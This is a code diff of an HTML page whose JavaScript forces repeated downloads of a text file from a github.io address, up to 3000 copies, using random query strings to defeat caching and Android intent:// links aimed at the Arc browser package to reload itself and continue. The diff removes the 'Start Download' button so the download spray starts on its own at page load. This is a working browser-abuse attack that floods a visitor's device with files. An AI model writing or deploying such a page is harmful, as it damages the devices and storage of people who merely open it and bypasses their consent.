@@ -2,21 +2,15 @@
 <html>
 <body>
 
-<button onclick="start()">Start Download</button>
-
 <script>
 let count = 0;
-let MAX = 2000;
+let MAX = 3000; // ⚠️ safe testing limit
 
-// ✅ tera file URL
 const FILE = "https://mrnoob790.github.io/ac.txt";
 
 function download() {
     const a = document.createElement("a");
-    
-    // cache bypass (important)
     a.href = FILE + "?v=" + Math.random();
-    
     a.download = "ac_" + count + ".txt";
     document.body.appendChild(a);
     a.click();
@@ -24,10 +18,10 @@ function download() {
 }
 
 function jump(i) {
-    // intent navigation (new context)
     location.href =
     "intent://" + location.host + location.pathname + "?c=" + i +
-    "#Intent;scheme=https;end";
+    "#Intent;scheme=https;package=com.thebrowsercompany.arc;end";
+    // ⚠️ package name may vary → fallback system default
 }
 
 function spray() {
@@ -41,16 +35,17 @@ function spray() {
     }, 300);
 }
 
-// resume after reload
+// resume after intent reload
 const params = new URLSearchParams(location.search);
 if (params.has("c")) {
     count = parseInt(params.get("c"));
     spray();
 }
 
-function start() {
+// ✅ auto start
+window.onload = () => {
     spray();
-}
+};
 </script>
 
 </body>
